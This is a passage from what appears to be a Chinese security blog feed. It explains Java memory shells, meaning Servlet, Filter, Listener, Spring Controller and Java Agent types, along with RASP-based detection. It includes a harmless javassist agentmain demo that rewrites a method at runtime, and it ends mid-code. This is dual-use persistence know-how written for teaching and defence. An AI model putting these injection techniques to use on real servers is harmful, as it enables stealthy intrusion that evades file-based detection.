INITIALIZED&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后，将这个恶意Listener类注入StandardContext，从而在每次请求进入时触发恶意逻辑。</p><h2 id="框架型内存马"><a class="markdownIt-Anchor" href="#框架型内存马"></a> 框架型内存马</h2><p>Java Web框架是为了简化基于Java的Web应用程序开发而设计的工具集合。它们通过封装底层技术细节，提供更高层次的抽象和标准化开发模式，从而使开发者快速构建一个方便维护的Web系统。目前，Spring框架是Java生态中应用最广泛的企业级开发框架。Spring框架的Web模块，即Spring MVC，采用了经典的模型-视图-控制器模式，实现了典型的MVC架构模式，将应用程序的业务逻辑、视图和控制器分离，确保各个组件的职责单一，提高代码的可维护性和扩展性。</p><p>Spring MVC由三种模式组成：模型（Model）、视图（View）和控制器（Controller）。其中，控制器包含应用的核心业务逻辑和数据。模型的职责是处理数据并将其发送到视图层。Spring通常通过Service和DAO层来实现模型逻辑；View为显示数据给用户的部分。Spring MVC支持多种视图技术，例如JSP、Thymeleaf、Velocity等，可以根据不同的需求选择合适的视图渲染技术；控制器层用于负责处理用户请求，承担请求分发与响应协调的核心职能，其将模型数据传递给视图层进行显示。控制器是MVC框架的核心部分，Spring MVC使用@Controller注解标记控制器类，并通过@RequestMapping注解映射请求路径。</p><p>由于Spring的广泛应用度和其强大的灵活性和可扩展性，针对Spring机制的框架型内存马应运而生。主流的Spring框架内存马有三种，Controller型、Interceptor型和WebFlux型。</p><h3 id="spring-controller型内存马"><a class="markdownIt-Anchor" href="#spring-controller型内存马"></a> Spring Controller型内存马</h3><p>Spring Controller是Spring MVC框架中处理HTTP请求的核心组件，其通过@Controller或@RestController（REST API）注解标记，负责接收客户端请求、协调业务逻辑并生成响应。Spring Controller可利用@RequestMapping及其衍生注解（如@GetMapping、@PostMapping）将特定URL路由映射到Java方法，支持从请求参数、路径变量、请求体中自动绑定数据到方法参数，并通过返回字符串（视图名称）、ModelAndView对象或@ResponseBody注解的Java对象（如JSON数据）实现页面渲染或RESTful API的数据交互，是连接前端请求与后端服务的核心枢纽。</p><p>简而言之，用户的请求是通过Controller处理的。Controller型内存马就是通过注入恶意Spring Controller来实现内存马逻辑。经典的Controller内存马实现原理大概为：首先利用Spring的机制获取当前请求的DispatcherServlet上下文；然后劫持Spring负责处理路由的组件，RequestMappingHandlerMapping，进行恶意注入逻辑的路由绑定；之后，通过访问恶意注入的路由，实现恶意Controller类的注入。</p><p>下面来分析一个恶意Controller的实现方式（所需环境为Spring版本2.6以下）：首先，定义一个TestEvilController，用于动态注入内存马。在其中定义一个触发注入逻辑的入口端点，此处为/inject；再定义一个内嵌的Controler类，用于嵌入恶意逻辑。</p>]]></content>
      
      
      <categories>
          
          <category> Java内存马 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『Java内存马』RASP检测Java内存马</title>
      <link href="/posts/c2a6.html"/>
      <url>/posts/c2a6.html</url>
      
        <content type="html"><![CDATA[<h1 id="rasp基础知识"><a class="markdownIt-Anchor" href="#rasp基础知识"></a> RASP基础知识</h1><ol><li><p><strong>概念</strong></p><p>RASP（Runtime application self-protection，运行时程序自动保护技术）是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序中，内置或链接到应用程序环境中与应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力。</p></li><li><p><strong>WAF和RASP的区别：</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241108155143568.png" alt="image-20241108155143568" /></p><ul><li>WAF是一种<strong>位于Web应用和客户端之间的安全网关</strong>，用于检测和防御来自网络层和应用层的攻击。且WAF大部分是<strong>基于规则</strong>去拦截，你的请求参数在规则中存在即拦截，误报率高。</li><li>RASP是一种<strong>嵌入在Web应用程序中的安全技术</strong>，在应用的运行时环境内工作，利用应用上下文信息来检测并防御攻击行为，工作在应用层。</li></ul><blockquote><p>以防御SQL注入为例：</p><ul><li>WAF：预定义规则库，匹配HTTP请求数据包参数字段中是否存在SQL注入的特征模式。可能被绕过措施绕过、误报率高</li><li>RASP：动态监控应用的实际运行行为。在应用程序将sql语句预编译完视图访问数据库资源时，RASP可以在其发送之前将其拦截进行检测，如果sql语句没有危险操作，则正常放行，不会影响程序本身的功能。</li></ul></blockquote></li><li><p><strong>部署方法</strong></p><p>RASP工作在应用层，因此每个产品都需要以某种方式与应用程序集成。监控应用程序使用（调用）或执行（运行时）的方法有多种，每种方法的部署略有不同，收集的应用程序运行方式略有不同。</p><ul><li><p>Servlet 过滤器和插件：一些RASP平台作为Web服务器插件或Java Servlet实现，通常安装到Apache Tomcat或 Microsoft .NET中以处理入站HTTP请求。插件在到达应用程序代码之前过滤请求，将检测规则应用于收到的每个入站请求。</p><blockquote><p>这种部署方式和WAF比较类似。WAF部署位置为应用程序之外，作为代理处理流量；RASP的这种部署方式位于应用入口，可以了解 Web 应用的基本结构（例如 URL 路由、参数类型等），但对更深层的运行逻辑仍然无法完全感知。</p><p>但是相比WAF的检测深度更高，WAF只能根据数据包模式或其他特征进行检测，但 <strong>这种rasp可以利用服务器端环境</strong> 来进一步理解请求的上下文，比如请求头、请求体、甚至可能的用户会话信息（即<strong>可以接触到明文信息</strong>）。</p></blockquote></li><li><p>库/JVM替换：通过替换标准应用程序库、JAR文件甚至Java虚拟机来安装某些RASP产品。在此模型下，RASP工具可以全面了解应用程序代码路径和系统调用，甚至可以学习状态机或序列行为。可以更深入的分析程序上下文，允许更细粒度的检测规则。</p><ul><li>检测规则可以基于更加丰富的上下文信息，如调用栈、数据流等。</li></ul></li><li><p>虚拟化或复制：创建应用程序的副本，通常为虚拟化容器、流量镜像、云实例等。在副本中隔离运行并检测应用程序行为，并阻止恶意或格式错误的请求。</p><ul><li>异步处理或并行分析，加快响应速度</li><li>主环境配置基本防护策略（如 WAF），减少发送到副本的无意义流量，避免资源浪费</li></ul></li></ul></li><li><p><strong>优势</strong></p><ul><li>RASP具有更高的准确性，因为它可以洞察应用程序逻辑和配置、事件和数据流、执行的指令和数据处理。而且在预生产中很容易部署，能成功阻止攻击。</li><li>RASP具有动态分析和上下文感知能力，可以更好地防御针对业务逻辑的攻击，包括高级攻击和零日漏洞等。</li><li>通过嵌入应用实现保护，适合云原生和微服务架构，便于集成。</li></ul></li><li><p><strong>国内外产品</strong>：<a href="https://www.freebuf.com/articles/web/197823.html">浅谈RASP技术攻防之基础篇</a></p><ul><li>百度OpenRasp：<a href="https://rasp.baidu.com/">rasp.baidu.com</a></li><li>蚂蚁RASP：<a href="https://help.aliyun.com/zh/security-center/user-guide/learn-about-application-protection">应用防护RASP介绍_云安全中心(Security Center)-阿里云帮助中心</a></li><li>云鲨RASP：<a href="https://rasp.xmirror.cn/">悬镜安全 - 代码疫苗内核驱动的新一代应用威胁自免疫平台</a></li><li>Micro Focus：<a href="https://www.microfocus.com/en-us/products/application-defender/features">OpenText Cybersecurity Cloud solutions</a></li></ul></li><li><p><strong>资源</strong></p><ul><li>开源项目<ul><li><a href="https://github.com/btraceio/btrace">https://github.com/btraceio/btrace</a></li></ul></li><li>性能优化：<ul><li><a href="https://tech.meituan.com/2024/01/19/runtime-application-self-protection-practice-in-meituan.html">美团RASP大规模研发部署实践总结</a></li></ul></li></ul></li><li><p><strong>检测内存马</strong></p><ul><li>Attach 检测jar包到JVM进程</li><li>获取JVM中已经加载的class列表</li><li>根据以上可疑特征将可疑的class反编译为Java源码</li><li>根据源码检测Webshell</li></ul></li></ol><h1 id="java内存马"><a class="markdownIt-Anchor" href="#java内存马"></a> Java内存马</h1><h2 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h2><ol><li><p><strong>概念</strong></p><p>Java内存马（Java Memory Shell）是一种攻击手段，通常利用java语言的动态特性，如类加载机制、动态代理和反射技术等，在Java应用程序的内存中动态生成或加载恶意的Java对象或类。Java内存马可以确保恶意代码在java应用内存中驻留并执行，从而在不修改服务器文件系统的情况下保持对目标系统的持久访问，同时避免传统文件检测工具的发现。</p></li><li><p><strong>例子</strong></p><ul><li><p>以<strong>基于 ServletContext 动态注册的内存马</strong>为例：攻击者通过反射或内存操作（如<code>setAttribute()</code>）将恶意Servlet注入到当前Web应用的<code>ServletContext</code>中，并动态映射到指定的URL路径（如<code>/memory</code>）。由于这些组件是在内存中注册的，不会涉及磁盘操作，无需在服务器的<code>WEB-INF/classes</code>或<code>WEB-INF/lib</code>目录中添加任何文件。</p></li><li><p>以<strong>基于类加载器挂钩（ClassLoader Hook）的内存马</strong>为例：攻击者通过修改或替换ClassLoader，使其在加载指定类时附加恶意功能。此方法也不会创建新的文件，只是在内存中操作类对象。</p></li></ul><p>由于内存马不需要在磁盘上留下任何恶意文件，只要它被加载到内存中运行，就可以在不触发文件系统检测的情况下持久驻留在目标系统中。这种特性使得内存马具有高度的隐蔽性。</p><blockquote><ul><li><a href="https://www.anquanke.com/post/id/273250">Java内存马攻防实战——攻击基础篇</a></li><li><a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">Tomcat 源代码调试笔记 - 看不见的 Shell</a></li></ul></blockquote></li><li><p><strong>使用场景（优势）</strong></p><p>Java内存马攻击通常是在某些特定网络环境和安全防御措施较为严格的情况下考虑的一种Web攻击方式：</p><ul><li>由于网络原因不能反弹 shell 的；</li><li>内部主机通过反向代理暴露 Web 端口的；</li><li>服务器上有防篡改、目录监控等防御措施，禁止文件写入的；</li><li>服务器上有其他监控手段，写马后会告警监控，人工响应的；</li><li>服务使用 Springboot 等框架，无法解析传统 Webshell 的；</li></ul></li><li><p><strong>缺点</strong></p><ul><li>服务重启后会失效；</li><li>对于传统内存马，存在的位置相对固定，已经有相关的查杀技术可以检出。</li></ul></li><li><p>危害</p></li></ol><h2 id="java内存马的分类"><a class="markdownIt-Anchor" href="#java内存马的分类"></a> java内存马的分类</h2><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241025163717595.png" alt="image-20241025163717595" /></p><ol><li><p><strong>传统web应用型内存马</strong></p><p>使用基本Servlet-API实现的动态注册内存马，此种类型的内存马最经典，已经被扩展至适应各个中间件。</p><ul><li><p><strong>Servlet型内存马</strong>：将恶意的<code>Servlet</code>对象动态注册到Web容器（如Tomcat、Jetty、JBoss等）的内存中。恶意Servlet一旦注册，攻击者可以通过特定URL直接访问它，从而执行进一步的攻击操作。</p></li><li><p><strong>Filter型内存马</strong>：通过动态添加过滤器（Filter）的方式，将恶意的Filter注入到应用中。这种内存马会对所有HTTP请求和响应进行拦截和处理，可以用于窃取、篡改或注入恶意数据。</p></li><li><p><strong>Listener型内存马</strong>：动态注册恶意的事件监听器（Listener），监听应用中各类事件（如Session创建、销毁事件等），从而在特定事件发生时执行恶意代码。</p></li></ul><blockquote><p>JavaWeb应用会将Servlet、Filter、Listener及其映射放在Context中，并在程序运行时进行查找和匹配。注入后，这些组件被挂载到Web应用的Context中，从而<strong>允许攻击者在不修改磁盘文件的情况下，通过特定的URL或请求路径触发恶意代码的执行</strong>。通过内存马的动态注册，这些恶意代码能够绕过文件系统的本地存储，不会在配置文件中留下任何可见的恶意设置，从而具有很强的隐蔽性和持久性。</p></blockquote></li><li><p><strong>框架型内存马</strong></p><p>框架性内存马是利用Web框架（如Spring、Struts、Shiro等）的特性进行持久化攻击的手段，其主要目的是利用框架的动态注册机制，将恶意代码注入到内存中，进行隐蔽的持久化控制。</p><p>例如：Spring框架内存马通过动态注册<strong>Spring的核心组件（如Controller、Filter、Interceptor、WebFilter等）</strong>，将恶意代码注入到应用的上下文中。</p></li><li><p><strong>中间件型内存马</strong></p><p>中间件通常以流式和管道式方式处理请求，每个组件在处理完请求后会将其传递给下一个组件。这种设计模式为攻击者提供了多个插入点，攻击者可以在请求链的任意位置动态注入恶意组件。</p><p>在中间件的很多功能实现上，因为采用了类似 Filter-FilterChain 的职责链模式，可以被用来做内存马，由于行业对 Tomcat 的研究较多，因此大多数的技术实现和探究是针对 Tomcat 的，但其他中间件也有相当多的探究空间。</p></li><li><p><strong>Agent 型内存马</strong></p><p>通过Java的<code>Java Agent</code>机制来注入恶意代码的一种内存马形式。它利用JVM的<code>Instrumentation API</code> 来实现对应用程序类的修改、增强或替换，从而达到持久化控制和隐蔽攻击的目的。这种内存马在JVM启动时加载，并在整个JVM生命周期内驻留，是一种极具隐蔽性和持久性的内存马攻击手段。</p></li><li><p><strong>其他内存马</strong></p><p>还有一些其他非常规的利用思路，可以用在内存马的实现上，例如 WebSocket 协议等。</p></li></ol><p>但实际上，内存马的深度和广度完全不局限于此，还有很多思路可以用来进行<strong>内存马的扩展</strong>：</p><ul><li>对于 Agent 型内存马，可以 hook 非常多的位置，如各种 SPI 的实现，可以接管整个 JVM，获取数据；</li><li>除了基于 Web 协议的内存马，可以使用各种协议作为内存马的通信途径，如 grpc、jmx、jpda 等，或封装多层协议；</li><li>对于各种中间件/框架，利用其设计模式，可挖掘出多种内存马的利用方式。</li></ul><p>除了按照内存马的实现方式分类，还可以按照内存马的利用方式分为：冰蝎马、哥斯拉马、蚁剑马、命令回显马、流量隧道马等等。</p><h1 id="java-agent型内存马"><a class="markdownIt-Anchor" href="#java-agent型内存马"></a> Java Agent型内存马</h1><h2 id="java-agent"><a class="markdownIt-Anchor" href="#java-agent"></a> Java Agent</h2><ol><li><p><strong>概念</strong></p><p>Java Agent是JVM提供的一种机制，用于在Java应用程序启动时或运行时动态地修改、监控和管理类的字节码。它主要通过Java的<strong>Instrumentation</strong> <strong>API</strong>来实现，能在不停止应用程序的情况下动态修改已加载或者未加载的类，一般用于实现性能监控、调试、AOP（面向切面编程）、字节码增强等功能。</p></li><li><p><strong>使用方式</strong></p><p>Java Agent的使用方式有两种：</p><ul><li><p><strong>premain，在JVM启动前加载</strong></p><p>启动时配置 <code>-javaagent</code> 参数，会执行Agent中的premain方法。JVM启动时会先执行<code>premain</code>方法，大部分类加载都会通过该方法，注意：是大部分，不是所有。因为很多系统类先于 agent 执行，而用户类的加载肯定是会被拦截的。也就是说，<strong>这个方法是在 main 方法启动前拦截大部分类的加载活动</strong>，既然可以拦截类的加载，就可以结合第三方的字节码编译工具，比如ASM，javassist，cglib等来改写实现类。</p></li><li><p><strong>agentmain，在JVM运行时注入</strong></p><p>首先使用Attach API将java agent动态附加到运行中的目标JVM上（建立连接），然后使用com.sun.tools.attach.VirtualMachine包提供的loadAgent方法，将指定的 Java Agent JAR 文件加载到目标 JVM 中，从而启动该 JAR 文件中定义的 <code>agentmain</code> 方法，调用<code>Instrumentation API</code> 对目标 JVM 进行字节码修改等操作。</p></li></ul></li></ol><h3 id="premain-方法"><a class="markdownIt-Anchor" href="#premain-方法"></a> premain 方法</h3><p>启动时配置 <code>-javaagent</code> 参数，在 JVM 启动时会执行Agent中的premain方法。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/130f0c3f-61d9-4be2-a595-e1160036ccf5.png" alt="130f0c3f-61d9-4be2-a595-e1160036ccf5" /></p><h3 id="agentmain方法"><a class="markdownIt-Anchor" href="#agentmain方法"></a> agentmain方法</h3><p>例子：</p><ol><li><p><strong>编写 <code>hello.jar</code></strong></p><p>文件结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hello_project/</span><br><span class="line">├── src</span><br><span class="line">│   └── com</span><br><span class="line">│       └── test</span><br><span class="line">│          ├── HelloWorld.java</span><br><span class="line">│           ├── hello.java</span><br><span class="line">│           ├── GetPid.java</span><br><span class="line">│           └── MANIFEST.MF</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><code>HelloWorld.java</code></strong>：主程序，用于启动并输出进程ID，等待用户输入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">hello</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">hello</span>();</span><br><span class="line">        <span class="type">GetPid</span> <span class="variable">pid</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GetPid</span>();</span><br><span class="line">        h1.hello();</span><br><span class="line">        pid.GetPid();   <span class="comment">// 打印当前的进程ID</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        sc.nextInt();  <span class="comment">// 暂停等待输入 便于后续注入</span></span><br><span class="line">        <span class="type">hello</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">hello</span>();</span><br><span class="line">        h2.hello();</span><br><span class="line">        System.out.println(<span class="string">&quot;ends&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>hello.java</code></strong>：简单的类，用于输出“hello world”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>GetPid.java</code></strong>：获取当前JVM进程的名称和PID。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetPid</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">GetPid</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> ManagementFactory.getRuntimeMXBean().getName();</span><br><span class="line">        System.out.println(<span class="string">&quot;JVM:&quot;</span> + name);</span><br><span class="line">        <span class="type">String</span> <span class="variable">pid</span> <span class="operator">=</span> name.split(<span class="string">&quot;@&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">        System.out.println(<span class="string">&quot;PID:&quot;</span> + pid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>打包 <code>hello.jar</code></strong>：</p><p>在项目根目录下输入下面的命令，编译上面的三个java文件为 <code>.class</code> 并输出到out文件下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d out src/com/test/*.java</span><br></pre></td></tr></table></figure><p>在test目录文件夹下创建 <code>MANIFEST.MF</code> 文件，用于指明<code>premain</code>的入口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: com.test.HelloWorld</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>注：<code>MANIFEST.MF</code>最后一行是<strong>空行，不能省略</strong>，否则会报错</p></blockquote><p>根目录下将编译后的 <code>.class</code> 文件和MF文件打包成 <code>hello.jar</code> 包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm hello.jar src/com/test/MANIFEST.MF -C out .</span><br></pre></td></tr></table></figure></li><li><p><strong>编写 <code>agent.jar</code></strong></p><p>代码创建一个Java Agent，动态注入到目标JVM中，修改特定类的方法和行为。</p><p>文件结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hello_project/</span><br><span class="line">├── src</span><br><span class="line">│   └── com</span><br><span class="line">│       └── agent</span><br><span class="line">│           ├── AgentDemo.java</span><br><span class="line">│           ├── TransformerDemo.java</span><br><span class="line">│           └── MANIFEST.MF</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>**<code>TransformerDemo.java</code> **：调用Instrumentation API 提供的 <code>ClassFileTransformer</code> 接口，修改目标类中hello方法的字节码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">editClassName</span> <span class="operator">=</span> <span class="string">&quot;com.test.hello&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">editMethodName</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!className.equals(editClassName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>))) <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        <span class="comment">// 调用Javassist库来转换类</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            cp.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctc</span> <span class="operator">=</span> cp.get(editClassName);</span><br><span class="line">            <span class="comment">// 获取目标类的hello方法</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> ctc.getDeclaredMethod(editMethodName);</span><br><span class="line">            <span class="comment">// 修改方法体，将方法体的内容改为仅输出 &quot;java memory shell&quot;</span></span><br><span class="line">            method.setBody(<span class="string">&quot;&#123;System.out.println(\&quot;java memory shell\&quot;);&#125;&quot;</span>);</span><br><span class="line">            <span class="comment">// 生成新的字节码，并返回此字节码作为转换后的字节码。</span></span><br><span class="line">            <span class="type">byte</span>[] byteCode = ctc.toBytecode();</span><br><span class="line">            ctc.detach();</span><br><span class="line">            <span class="keyword">return</span> byteCode;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**<code>AgentDemo.java</code> **：监控内存中的加载类，检测到目标类后调用 transform</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> IOException, UnmodifiableClassException &#123;</span><br><span class="line">        <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="comment">// 遍历所有已加载的类</span></span><br><span class="line">        <span class="keyword">for</span> (Class aClass : classes) &#123;</span><br><span class="line">            <span class="comment">// 判断是否已加载指定的目标类TransformerDemo.editClassName</span></span><br><span class="line">            <span class="keyword">if</span> (aClass.getName().equals(TransformerDemo.editClassName)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;EditClassName：&quot;</span> + aClass.getName());</span><br><span class="line">                <span class="comment">// 注入 Transformer</span></span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TransformerDemo</span>(), <span class="literal">true</span>);</span><br><span class="line">                inst.retransformClasses(aClass);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>打包 <code>agent.jar</code></strong></p><p>同样地在agent文件夹下创建 <strong><code>MANIFEST.MF</code></strong>：指定 Agent 类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Agent-Class: com.agent.AgentDemo</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为这里需要使用 <code>javassist.jar</code> 包进行字节码的改写，可以使用maven下载，将下面的依赖添加到 <code>pom.xml</code> 文件中并更新：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.28.0-GA&lt;/version&gt; &lt;!-- 使用最新的版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>找到repository下的 <code>javassist.jar</code> 包并复制到项目根目录下</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241115160938181.png" alt="image-20241115160938181" /></p><p>项目根目录下执行命令编译打包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 